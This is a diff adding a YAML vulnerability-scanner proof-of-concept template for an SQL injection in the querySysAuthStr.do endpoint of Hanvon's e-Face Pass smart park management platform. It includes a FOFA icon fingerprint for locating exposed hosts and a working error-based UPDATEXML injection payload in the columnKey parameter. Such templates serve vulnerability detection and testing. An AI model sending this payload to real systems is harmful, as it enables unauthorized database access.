@@ -1,0 +1,18 @@
+id: poc-yaml-hw-e-face-pass-spmp-querysysauthstr-do-sqli
+info:
+  name: 汉王e脸通智慧园区管理平台 querySysAuthStr.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /manage/sysAuthStr/querySysAuthStr.do?columnKey=(UPDATEXML(2920,CONCAT(0x7e,md5({{.t1}}),0x7e,(SELECT/**/(ELT(2920=2920,1)))),8357))&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS
+  expression: status_code == 200 && contains(body,"success") && contains(body,"hanvon")
+    && contains(body,"XPATH syntax error") && contains(body,"java.sql.SQLException")
+    && contains(body,substr(t2,0,31))
+transport: http
